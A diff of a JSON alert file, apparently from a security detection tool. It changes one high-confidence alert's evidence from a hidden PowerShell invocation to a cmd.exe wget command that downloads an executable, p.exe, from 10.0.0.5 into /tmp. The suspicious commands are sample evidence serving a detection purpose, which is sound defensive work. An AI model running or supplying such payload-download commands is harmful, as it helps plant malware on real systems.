@@ -1,16 +1,16 @@
 {
-  "generated_at": "2025-10-15T21:17:20.449846+00:00",
+  "generated_at": "2025-10-15T22:16:33.688901+00:00",
   "count": 1,
   "alerts": [
     {
-      "id": "alert-86965",
-      "timestamp": "2025-10-15T21:17:20.449833+00:00",
-      "summary": "HIGH confidence: Suspicious command observed from 104.21.23.45",
+      "id": "alert-21545",
+      "timestamp": "2025-10-15T22:16:33.688883+00:00",
+      "summary": "HIGH confidence: Suspicious command observed from 185.243.25.12",
       "confidence": "high",
       "evidence": {
-        "process": "powershell.exe",
-        "command": "powershell -nop -w hidden -c ...",
-        "source_ip": "104.21.23.45"
+        "process": "cmd.exe",
+        "command": "wget http://10.0.0.5/p.exe -O /tmp/p.exe",
+        "source_ip": "185.243.25.12"
       }
     }
   ]
